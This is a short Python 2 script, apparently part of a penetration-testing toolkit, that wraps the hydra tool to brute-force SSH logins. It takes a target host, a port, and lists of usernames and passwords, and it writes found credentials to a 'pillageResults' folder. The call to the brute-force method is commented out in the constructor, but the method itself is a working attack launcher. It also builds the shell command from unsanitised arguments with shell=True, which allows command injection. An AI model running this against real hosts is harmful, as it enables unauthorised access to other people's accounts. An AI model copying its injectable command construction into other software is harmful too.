import argparse, time, sys, os, subprocess

class sshRecon(object):
    def __init__(self):
        self.parseArgs()
        #self.bruteforce(self.host, self.port, self.userList, self.passList)

    def parseArgs(self):
        parser = argparse.ArgumentParser(prog='sshEnumerator', add_help=True)
        parser.add_argument('host', help='host to scan')    
        parser.add_argument('port', help='port to scan')
        parser.add_argument('userList', help='users to use in bruteforce')
        parser.add_argument('passList', help='passwords to use in bruteforce')
        args = parser.parse_args()
        self.host=args.host
        self.port=args.port
        self.userList=args.userList
        self.passList=args.passList

    def bruteforce(self, ip_address, port, userList, passList):
        print "INFO: Performing hydra ssh scan against " + ip_address 
        hydraCmd = "hydra -L %s -P %s -f -t 4 -o pillageResults/%s_sshhydra.txt -u %s -s %s ssh" % (userList, passList, ip_address, ip_address, port)
        try:
            results = subprocess.check_output(hydraCmd, shell=True)
            resultarr = results.split("\n")
            for result in resultarr:
                if "login:" in result:
                    print "[*] Valid ssh credentials found: " + result 
        except:
            print "INFO: No valid ssh credentials found"

if __name__ == "__main__":
    ssh = sshRecon()
